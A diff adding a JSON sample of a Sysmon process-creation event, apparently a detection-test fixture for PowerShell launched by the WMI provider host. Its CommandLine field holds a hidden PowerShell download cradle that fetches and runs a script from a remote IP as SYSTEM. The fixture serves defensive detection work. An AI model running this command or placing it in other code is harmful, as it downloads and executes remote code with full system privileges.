@@ -1,0 +1,13 @@
+{
+  "_comment": "PowerShell spawned by the WMI provider host, the receiving end of WMI execution",
+  "EventID": 1,
+  "UtcTime": "2026-08-11 10:00:00.000",
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "CommandLine": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://45.61.13.7/s')",
+  "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+  "ParentCommandLine": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+  "CurrentDirectory": "C:\\Windows\\System32\\",
+  "User": "NT AUTHORITY\\SYSTEM",
+  "ProcessId": 7802,
+  "IntegrityLevel": "System"
+}
